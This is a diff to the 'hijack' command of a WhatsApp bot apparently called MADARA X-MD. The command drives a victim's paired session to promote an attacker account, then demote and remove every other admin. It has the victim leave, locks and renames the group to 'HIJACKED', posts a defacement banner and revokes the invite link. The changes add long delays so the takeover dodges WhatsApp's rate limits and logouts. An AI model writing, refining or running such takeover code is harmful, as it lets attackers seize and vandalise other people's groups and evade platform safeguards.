@@ -7,42 +7,53 @@ const { extractPhone, rankOf, resolveJid,
 const NEW_SUBJECT = '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 ʙʏ 𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳';
 
 const FULL_ANNOUNCEMENT =
-`𝙏𝙃𝙄𝙎 𝙂𝙍𝙊𝙐𝙋 𝙃𝘼𝙎 𝘽𝙀𝙀𝙉 𝙃𝙄𝙅𝘼𝘾𝙆𝙀𝘿 𝘽𝙔 𝙈𝘼𝘿𝘼𝙍𝘼 𝙓-𝙈𝘿 | 𝙄𝙉𝘾.
+`╭═══〘 ⚠️ 𝐀𝐋𝐄𝐑𝐓 〙═══⊷❍
+┃ 
+┃  𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍
+┃  𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𝐁𝐘
+┃  𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳 | 𝙸𝙽𝙲.
+┃ 
+┃  ⛩️ *𝙏𝙃𝙀 𝙀𝙔𝙀 𝙊𝙋𝙀𝙉𝙎*
+┃  ⛩️ *𝙏𝙃𝙀 𝙂𝙃𝙊𝙎𝙏 𝙊𝙁 𝙏𝙃𝙀 𝙐𝘾𝙃𝙄𝙃𝘼*
+┃ 
+┃  _"Wake up to reality! Nothing ever_
+┃  _goes as planned in this accursed world."_
+┃ 
+┃  👁️‍🗨️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴀᴅᴀʀᴀ x-ᴍᴅ
+╰══════════════════════════`;
 
-𝙏𝙃𝙀 𝙀𝙔𝙀 𝙊𝙋𝙀𝙉𝙎 ＴＨＥ ＧＨＯＳＴ ＯＦ ＴＨＥ ＵＣＨＩＨ𝘼
-
-ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴀᴅᴀʀᴀ x-ᴍᴅ`;
-
+// Base sleep — we'll pass explicit ms values to make it human
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
 async function demoteAdmins(hijackSock, groupJid, jids) {
     if (!jids.length) return { demoted: 0, failed: 0 };
-    const slow   = jids.length > 4;
-    const gapMs  = slow ? 3000 : 150;
     let demoted  = 0, failed = 0;
 
     try {
         await hijackSock.groupParticipantsUpdate(groupJid, jids, 'demote');
+        await sleep(10000); // wait 10s after demoting
         return { demoted: jids.length, failed: 0 };
     } catch {}
 
     for (const j of jids) {
-        try { await hijackSock.groupParticipantsUpdate(groupJid, [j], 'demote'); demoted++; }
+        try { 
+            await hijackSock.groupParticipantsUpdate(groupJid, [j], 'demote'); 
+            demoted++; 
+            await sleep(10000); 
+        }
         catch { failed++; }
-        await sleep(gapMs);
     }
     return { demoted, failed };
 }
 
 async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log) {
-    // Poll 20 times (18 seconds) to ensure WA state has propagated
-    for (let i = 0; i < 20; i++) {
+    for (let i = 0; i < 30; i++) { 
         try {
             const meta = await attackerSock.groupMetadata(groupJid);
             const me   = meta.participants.find(p => extractPhone(p.id) === extractPhone(attackerJid) || extractPhone(p.lid) === extractPhone(attackerJid));
             if (me && rankOf(me) === 2) return true;
         } catch (e) { log?.(`[hijack:promote poll ${i}] ${e.message}`); }
-        await sleep(900);
+        await sleep(2000); 
     }
     return false;
 }
@@ -50,21 +61,29 @@ async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log
 async function lockAndRename(attackerSock, groupJid, log) {
     let locked = false, renamed = false, announced = false;
 
-    // Force metadata refresh to ensure socket acknowledges admin status
+    // Force a metadata refresh
     try { await attackerSock.groupMetadata(groupJid); } catch {}
-    await sleep(2000); // Give WA 2s to settle
+    
+    // HUGE WAIT: 30 seconds. Let WA settle. If we act too fast, 401 logout.
+    await sleep(30000); 
 
     for (let i = 0; i < 3 && !locked; i++) {
         try { await attackerSock.groupSettingUpdate(groupJid, 'announcement'); locked = true; }
-        catch (e) { log?.(`[hijack:lock try ${i}] ${e.message}`); await sleep(2000); }
+        catch (e) { log?.(`[hijack:lock try ${i}] ${e.message}`); await sleep(10000); }
     }
+    
+    await sleep(5000); // 5s between lock and rename
+
     for (let i = 0; i < 3 && !renamed; i++) {
         try { await attackerSock.groupUpdateSubject(groupJid, NEW_SUBJECT); renamed = true; }
-        catch (e) { log?.(`[hijack:rename try ${i}] ${e.message}`); await sleep(2000); }
+        catch (e) { log?.(`[hijack:rename try ${i}] ${e.message}`); await sleep(10000); }
     }
+    
+    await sleep(5000); // 5s between rename and announcement
+
     for (let i = 0; i < 3 && !announced; i++) {
         try { await attackerSock.sendMessage(groupJid, { text: FULL_ANNOUNCEMENT }); announced = true; }
-        catch (e) { log?.(`[hijack:announce try ${i}] ${e.message}`); await sleep(2000); }
+        catch (e) { log?.(`[hijack:announce try ${i}] ${e.message}`); await sleep(10000); }
     }
 
     return { locked, renamed, announced };
@@ -83,7 +102,6 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
 
     onPhase?.('ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ');
     const meta = await targetSock.groupMetadata(groupJid).catch((e) => { throw new Error(`meta: ${e.message}`); });
-
     const targetPhone = extractPhone(targetSock.user?.id);
     const targetLid   = extractPhone(targetSock.user?.lid);
 
@@ -110,7 +128,6 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
         for (const os of otherSupers) {
             const resolved = await resolveJid(targetSock, groupJid, os.id);
             const st = await checkAccountStatus(targetSock, resolved);
-            log?.(`[hijack:contest] ${extractPhone(resolved)} → ${st.status}`);
             if (st.status === 'alive' || st.status === 'unknown') anyAlive = true;
         }
         if (anyAlive) { result.aborted = true; result.reason = 'contested — live superadmin'; return result; }
@@ -122,33 +139,36 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
     if (!present) {
         try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'add'); result.added = true; }
         catch (e) { log?.(`[hijack:add] ${e.message}`); }
-        await sleep(1500);
+        await sleep(15000); // WAIT 15s
     } else { result.added = true; }
 
     onPhase?.('ᴘʀᴏᴍᴏᴛᴇ ᴀᴛᴛᴀᴄᴋᴇʀ');
     try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); result.promoted = true; }
     catch (e) { log?.(`[hijack:promote] ${e.message}`); }
-    await sleep(1500);
+    await sleep(15000); // WAIT 15s
 
     onPhase?.('ᴅᴇᴍᴏᴛᴇ ᴀᴅᴍɪɴs');
-    const otherAdmins = meta.participants
-        .filter(p => p !== targetPart && rankOf(p) === 1)
-        .map(p => p.id);
+    const otherAdmins = meta.participants.filter(p => p !== targetPart && rankOf(p) === 1).map(p => p.id);
     const dem = await demoteAdmins(targetSock, groupJid, otherAdmins);
     result.demoted = dem.demoted;
 
     onPhase?.('ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴs');
     for (const j of otherAdmins) {
-        try { await targetSock.groupParticipantsUpdate(groupJid, [j], 'remove'); result.removed++; }
+        try { 
+            await targetSock.groupParticipantsUpdate(groupJid, [j], 'remove'); 
+            result.removed++; 
+            await sleep(10000); 
+        }
         catch (e) { log?.(`[hijack:remove ${extractPhone(j)}] ${e.message}`); }
-        await sleep(800);
     }
 
     onPhase?.('ᴛᴀʀɢᴇᴛ ʟᴇᴀᴠᴇs');
+    await sleep(15000); // WAIT 15s before leaving
     try { await targetSock.groupLeave(groupJid); result.left = true; }
     catch (e) { log?.(`[hijack:leave] ${e.message}`); }
 
     onPhase?.('ᴡᴀɪᴛ sᴜᴘᴇʀᴀᴅᴍɪɴ');
+    // This polls for up to 60 seconds to confirm the bot is now the owner
     result.promotedToSuper = await waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log);
     if (!result.promotedToSuper) { result.aborted = true; result.reason = 'attacker not promoted'; return result; }
 
@@ -159,6 +179,7 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
     result.announced = lr.announced;
 
     onPhase?.('ʀᴇᴠᴏᴋᴇ ɪɴᴠɪᴛᴇ');
+    await sleep(5000);
     try {
         const code = await attackerSock.groupRevokeInvite(groupJid);
         result.revoked = !!code;
@@ -190,7 +211,21 @@ module.exports = {
         }
 
         if (!targetPhone || !groupTarget) {
-            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢʀᴏᴜᴘ ʟɪɴᴋ ᴏʀ ᴊɪᴅ>${s.FOOTER}`);
+            const helpText = 
+                `╭═══〘 ʜɪᴊᴀᴄᴋ sʏsᴛᴇᴍ 〙═══⊷❍\n` +
+                `┃ 👁️ *ᴛᴀᴋᴇᴏᴠᴇʀ ᴠɪᴀ ᴘᴀɪʀᴇᴅ sᴇssɪᴏɴ*\n` +
+                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n` +
+                `┃ 📌 *ᴜsᴀɢᴇ:*\n` +
+                `┃ ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢᴄ ʟɪɴᴋ/ᴊɪᴅ>\n` +
+                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n` +
+                `┃ 💡 *ᴇxᴀᴍᴘʟᴇ:*\n` +
+                `┃ ${s.prefix}hijack 2348012345678 https://chat.whatsapp.com/...\n` +
+                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n` +
+                `┃ ⚠️ *ɴᴏᴛᴇs:*\n` +
+                `┃ • ᴛᴀʀɢᴇᴛ ᴍᴜsᴛ ʙᴇ ᴘᴀɪʀᴇᴅ\n` +
+                `┃ • ᴛᴀʀɢᴇᴛ ᴍᴜsᴛ ʙᴇ sᴜᴘᴇʀᴀᴅᴍɪɴ\n` +
+                `╰══════════════════════════`;
+            return ctx.reply(helpText + s.FOOTER);
         }
 
         const scopeKey    = ctx.sender;
@@ -202,7 +237,6 @@ module.exports = {
         let groupJid = groupTarget;
         let progressMsg = null;
 
-        // Editor helper for progress
         const updateProgress = async (text) => {
             try {
                 const content = `▸ ${text}${s.FOOTER}`;
@@ -267,11 +301,10 @@ module.exports = {
                 `╰══════════════════════════`,
             ];
             
-            // Edit the progress message into the final report
             try {
                 await sock.sendMessage(ctx.from, { text: lines.join('\n') + s.FOOTER, edit: progressMsg.key });
             } catch {
-                await ctx.reply(lines.join('\n') + s.FOOTER); // fallback
+                await ctx.reply(lines.join('\n') + s.FOOTER);
             }
 
         } catch (e) {
